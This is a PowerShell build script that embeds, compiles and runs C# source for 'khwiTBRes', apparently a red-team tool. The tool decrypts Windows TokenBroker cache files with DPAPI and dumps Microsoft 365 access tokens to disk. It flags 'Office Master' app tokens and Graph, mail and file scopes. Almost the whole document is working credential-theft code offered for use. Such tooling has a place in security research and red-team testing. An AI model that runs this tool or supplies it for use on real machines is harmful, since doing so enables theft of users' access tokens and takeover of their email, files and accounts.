# khwiTBRes - TokenBroker Hunter
# Enhanced TBRES decryptor compatible with .NET Framework 4.x

param(
    [switch]$BuildOnly,
    [switch]$Help
)

if ($Help) {
    Write-Host "khwiTBRes Decryptor - Build Script" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Usage:" -ForegroundColor Yellow
    Write-Host "  .\BuildAndRun-khwiTBRes.ps1          # Build and run automatically"
    Write-Host "  .\BuildAndRun-khwiTBRes.ps1 -BuildOnly   # Only build the .exe, don't run"
    Write-Host "  .\BuildAndRun-khwiTBRes.ps1 -Help        # Show this help"
    Write-Host ""
    Write-Host "Output:" -ForegroundColor Yellow
    Write-Host "  khwiTBRes.exe - The compiled executable"
    Write-Host ""
    Write-Host "Features:" -ForegroundColor Yellow
    Write-Host "  - Office Master AppID detection (d3590ed6-52b1-4102-aeff-aad2292ab01c)"
    Write-Host "  - ASCII banner highlighting (PSRemoting compatible!)"
    Write-Host "  - Microsoft Graph audience detection"
    Write-Host "  - Automatic DPAPI decryption"
    Write-Host ""
    exit 0
}

$ErrorActionPreference = "Stop"

Write-Host "=== khwiTBRes Decryptor Build Script ===" -ForegroundColor Cyan
Write-Host ""

# Define paths
$ScriptDir = $PSScriptRoot
if (-not $ScriptDir) {
    $ScriptDir = Get-Location
}

$SourceFile = Join-Path $ScriptDir "khwiTBRes.cs"
$OutputExe = Join-Path $ScriptDir "khwiTBRes.exe"

# C# Source Code - Compatible with .NET Framework 4.x
# SIMPLE VERSION - Just ASCII banners, no complex JWT parsing
$CSharpCode = @'
using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace khwiTBRes
{
    public class Program
    {
        // Office Master AppID - This is what we're looking for!
        private const string OFFICE_MASTER_APPID = "d3590ed6-52b1-4102-aeff-aad2292ab01c";
        
        public static string[] GetFiles(string dir)
        {
            if (!Directory.Exists(dir))
            {
                return new string[0];
            }
            return Directory.GetFiles(dir, "*.tbres");
        }

        public static string ExtractJsonValue(string json, string fieldPath)
        {
            // Simple JSON field extraction using regex
            string pattern = "\"" + fieldPath + "\"\\s*:\\s*\"([^\"]+)\"";
            Match match = Regex.Match(json, pattern);
            if (match.Success)
            {
                return match.Groups[1].Value;
            }
            return null;
        }

        public static void OutputDecryptedData(string origFile, string fileContent, ref int officeMasterCount)
        {
            string fileName = Path.GetFileName(origFile);
            
            try
            {
                // XPN's approach: Extract Value from ResponseBytes section
                int responseBytesIndex = fileContent.IndexOf("\"ResponseBytes\"");
                if (responseBytesIndex == -1)
                {
                    Console.WriteLine("[!] ResponseBytes not found in {0}", fileName);
                    return;
                }

                // Find the Value field after ResponseBytes
                string afterResponseBytes = fileContent.Substring(responseBytesIndex);
                int valueStart = afterResponseBytes.IndexOf("\"Value\":\"");
                
                if (valueStart == -1)
                {
                    Console.WriteLine("[!] Value field not found in {0}", fileName);
                    return;
                }

                valueStart += "\"Value\":\"".Length;
                int valueEnd = afterResponseBytes.IndexOf("\"", valueStart);
                
                if (valueEnd == -1)
                {
                    Console.WriteLine("[!] Value field end not found in {0}", fileName);
                    return;
                }

                string encodedData = afterResponseBytes.Substring(valueStart, valueEnd - valueStart);

                // Clean up the base64 string
                encodedData = encodedData.Replace("\n", "").Replace("\r", "").Replace(" ", "").Replace("\\n", "").Replace("\\r", "");

                // Decode from base64
                byte[] encryptedData;
                try
                {
                    encryptedData = Convert.FromBase64String(encodedData);
                }
                catch (FormatException ex)
                {
                    Console.WriteLine("[!] Base64 Decode Error for {0}: {1}", fileName, ex.Message);
                    return;
                }

                // Decrypt with DPAPI
                byte[] decryptedData;
                try
                {
                    decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                }
                catch (CryptographicException ex)
                {
                    Console.WriteLine("[!] DPAPI Decrypt Error for {0}: {1}", fileName, ex.Message);
                    return;
                }

                // Write decrypted data
                string outputFile = fileName + ".decrypted";
                File.WriteAllBytes(outputFile, decryptedData);
                
                // Convert to string to extract info
                string decryptedText = Encoding.UTF8.GetString(decryptedData);
                
                // Check if this is an Office Master token
                bool isOfficeMaster = decryptedText.Contains(OFFICE_MASTER_APPID) || 
                                     decryptedText.Contains("d3590ed6-52b3-4102-aeff-aad2292ab01c");
                
                if (isOfficeMaster)
                {
                    officeMasterCount++;
                    Console.WriteLine("###############################################");
                    Console.WriteLine("###   *** OFFICE MASTER TOKEN FOUND! ***   ###");
                    Console.WriteLine("###############################################");
                }
                
                Console.WriteLine("[*] TBRES Decrypted: {0}", outputFile);

                // Try to extract useful info
                try
                {
                    // Extract client_id (works with current regex)
                    string clientId = ExtractJsonValue(decryptedText, "client_id");
                    if (!string.IsNullOrEmpty(clientId))
                    {
                        Console.WriteLine("    -> client_id: {0}", clientId);
                    }

                    // Extract scope from JSON (the .default scope line)
                    string scopeJson = ExtractJsonValue(decryptedText, "scope");
                    if (!string.IsNullOrEmpty(scopeJson))
                    {
                        Console.WriteLine("    -> scope: {0}", scopeJson);
                        
                        // Extract audience from scope URL
                        if (scopeJson.Contains("graph.microsoft.com"))
                        {
                            Console.WriteLine("    -> audience: https://graph.microsoft.com [Microsoft Graph] <<<");
                        }
                        else if (scopeJson.Contains("outlook.office365.com"))
                        {
                            Console.WriteLine("    -> audience: https://outlook.office365.com [Outlook/Exchange]");
                        }
                    }
                    
                    // Also try to find wamcompat_scopes (the full detailed scope list)
                    int wamIndex = decryptedText.IndexOf("wamcompat_scopes");
                    if (wamIndex != -1)
                    {
                        string afterWam = decryptedText.Substring(wamIndex);
                        int scopeStart = afterWam.IndexOf("https://");
                        if (scopeStart != -1)
                        {
                            int scopeEnd = afterWam.IndexOf("\n", scopeStart);
                            if (scopeEnd == -1) scopeEnd = afterWam.IndexOf("\r", scopeStart);
                            if (scopeEnd == -1) scopeEnd = afterWam.Length;
                            
                            string fullScopes = afterWam.Substring(scopeStart, Math.Min(300, scopeEnd - scopeStart));
                            
                            // Count unique scopes
                            string[] scopeArray = fullScopes.Split(new string[] { " https://" }, StringSplitOptions.RemoveEmptyEntries);
                            if (scopeArray.Length > 1)
                            {
                                Console.WriteLine("    -> detailed_scopes: {0} permissions found", scopeArray.Length);
                                
                                // Show first few important ones
                                int shown = 0;
                                foreach (string s in scopeArray)
                                {
                                    if (shown >= 5) break;
                                    if (s.Contains("Mail.") || s.Contains("Files.") || s.Contains("Calendar") || s.Contains("Contacts"))
                                    {
                                        string scopeName = s.Length > 60 ? s.Substring(0, 60) + "..." : s;
                                        if (!scopeName.StartsWith("https://"))
                                        {
                                            scopeName = "https://" + scopeName;
                                        }
                                        Console.WriteLine("       - {0}", scopeName);
                                        shown++;
                                    }
                                }
                            }
                        }
                    }

                    // Extract TokenExpiresOn (Windows timestamp format)
                    int expiresIndex = decryptedText.IndexOf("TokenExpiresOn");
                    if (expiresIndex != -1)
                    {
                        string afterExpires = decryptedText.Substring(expiresIndex + 14);
                        // Find the timestamp (series of digits)
                        Match tsMatch = Regex.Match(afterExpires, @"(\d{10,})");
                        if (tsMatch.Success)
                        {
                            try
                            {
                                long timestamp = long.Parse(tsMatch.Groups[1].Value);
                                // Convert from Windows timestamp (100-nanosecond intervals since 1601)
                                DateTime expDate = DateTime.FromFileTimeUtc(timestamp);
                                Console.WriteLine("    -> expires: {0}", expDate.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss"));
                            }
                            catch
                            {
                                Console.WriteLine("    -> expires: {0} (raw)", tsMatch.Groups[1].Value);
                            }
                        }
                    }
                }
                catch
                {
                    // Ignore parsing errors
                }
                
                if (isOfficeMaster)
                {
                    Console.WriteLine("###############################################");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Unexpected Error for {0}: {1}", fileName, ex.Message);
            }
        }

        public static void DecryptFiles(string dir)
        {
            var files = GetFiles(dir);
            Console.WriteLine("[*] Found {0} TBRES files to process", files.Length);
            Console.WriteLine("");

            if (files.Length == 0)
            {
                Console.WriteLine("[!] No TBRES files found in directory!");
                return;
            }

            int successCount = 0;
            int errorCount = 0;
            int officeMasterCount = 0;

            foreach (var file in files)
            {
                string fileContent = null;
                
                // TBRES files are stored in Unicode (UTF-16LE)
                try
                {
                    byte[] bytes = File.ReadAllBytes(file);
                    fileContent = Encoding.Unicode.GetString(bytes);
                    
                    if (string.IsNullOrEmpty(fileContent) || !fileContent.Contains("TBDataStoreObject"))
                    {
                        fileContent = Encoding.UTF8.GetString(bytes);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Cannot read file {0}: {1}", Path.GetFileName(file), ex.Message);
                    errorCount++;
                    continue;
                }

                // Clean up
                if (fileContent != null)
                {
                    fileContent = fileContent.TrimEnd('\0', '\r', '\n', ' ', '\uFEFF');
                    if (fileContent.Length > 0 && fileContent[0] == '\uFEFF')
                    {
                        fileContent = fileContent.Substring(1);
                    }
                }

                if (!File.Exists(file))
                {
                    Console.WriteLine("[!] File disappeared: {0}", Path.GetFileName(file));
                    errorCount++;
                    continue;
                }

                string outputFile = Path.GetFileName(file) + ".decrypted";

                // Process the file
                OutputDecryptedData(file, fileContent, ref officeMasterCount);
                
                // Check if decryption was successful
                if (File.Exists(outputFile))
                {
                    successCount++;
                }
                else
                {
                    errorCount++;
                }

                Console.WriteLine("");
            }

            Console.WriteLine("[*] === SUMMARY ===");
            Console.WriteLine("[*] Total files: {0}", files.Length);
            Console.WriteLine("[*] Successfully decrypted: {0}", successCount);
            Console.WriteLine("[*] Errors: {0}", errorCount);
            
            if (officeMasterCount > 0)
            {
                Console.WriteLine("###############################################");
                Console.WriteLine("### OFFICE MASTER TOKENS FOUND: {0}", officeMasterCount);
                Console.WriteLine("###############################################");
            }
            else
            {
                Console.WriteLine("[*] No Office Master tokens found in this batch");
            }
        }

        public static void Main(string[] args)
        {
            Console.WriteLine("khwiTBRes - TokenBroker Hunter");
            Console.WriteLine("Enhanced TBRES Decryption Tool - with Office Master AppID detection");
            Console.WriteLine("By r3alm0m1x82/safebreach.it - inspired by the work of @_xpn_");
            Console.WriteLine("");
            
            string path = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                @"Microsoft\TokenBroker\Cache"
            );
            
            Console.WriteLine("[*] Cache Path: {0}", path);
            Console.WriteLine("[*] Looking for Office Master AppID: {0}", OFFICE_MASTER_APPID);
            Console.WriteLine("");

            if (!Directory.Exists(path))
            {
                Console.WriteLine("[!] ERROR: Token cache directory not found!");
                Console.WriteLine("[!] Path: {0}", path);
                return;
            }

            DecryptFiles(path);
            
            Console.WriteLine("");
            Console.WriteLine("[*] Decrypted files saved in current directory with .decrypted extension");
            Console.WriteLine("[*] Look for ASCII banners: '### OFFICE MASTER TOKEN FOUND! ###'");
            Console.WriteLine("[*] Microsoft Graph tokens marked with '<<<' arrows");
        }
    }
}
'@

# Write source code to file
Write-Host "[*] Writing source code to: $SourceFile" -ForegroundColor Green
Set-Content -Path $SourceFile -Value $CSharpCode -Encoding UTF8

# Find C# compiler
$CscPath = $null
$PossiblePaths = @(
    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
    "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
)

foreach ($Path in $PossiblePaths) {
    if (Test-Path $Path) {
        $CscPath = $Path
        break
    }
}

if (-not $CscPath) {
    Write-Host "[!] ERROR: C# compiler (csc.exe) not found!" -ForegroundColor Red
    Write-Host "[!] Install .NET Framework SDK or use Visual Studio" -ForegroundColor Red
    exit 1
}

Write-Host "[*] Using C# compiler: $CscPath" -ForegroundColor Green

# Delete old executable if exists
if (Test-Path $OutputExe) {
    Write-Host "[*] Removing old executable..." -ForegroundColor Yellow
    Remove-Item $OutputExe -Force
}

# Compile
Write-Host "[*] Compiling khwiTBRes.exe..." -ForegroundColor Green
Write-Host ""

$CompileArgs = @(
    "/out:$OutputExe",
    "/target:exe",
    "/optimize+",
    $SourceFile
)

& $CscPath $CompileArgs 2>&1 | ForEach-Object { Write-Host $_ }

if ($LASTEXITCODE -ne 0) {
    Write-Host "" 
    Write-Host "[!] Compilation failed!" -ForegroundColor Red
    exit 1
}

if (-not (Test-Path $OutputExe)) {
    Write-Host ""
    Write-Host "[!] Executable not created!" -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "[*] Compilation successful!" -ForegroundColor Green
Write-Host "[*] Executable created: $OutputExe" -ForegroundColor Green
Write-Host "[*] Office Master detection: ENABLED" -ForegroundColor Green
Write-Host "[*] PSRemoting compatible: ASCII banners" -ForegroundColor Green
Write-Host ""

if ($BuildOnly) {
    Write-Host "[*] Build-only mode: Executable ready to use" -ForegroundColor Yellow
    Write-Host "[*] Run manually with: .\khwiTBRes.exe" -ForegroundColor Yellow
    Write-Host ""
    exit 0
}

Write-Host "=== Running khwiTBRes ===" -ForegroundColor Cyan
Write-Host ""

# Run the decryptor
& $OutputExe

Write-Host ""
Write-Host "=== Done ===" -ForegroundColor Cyan

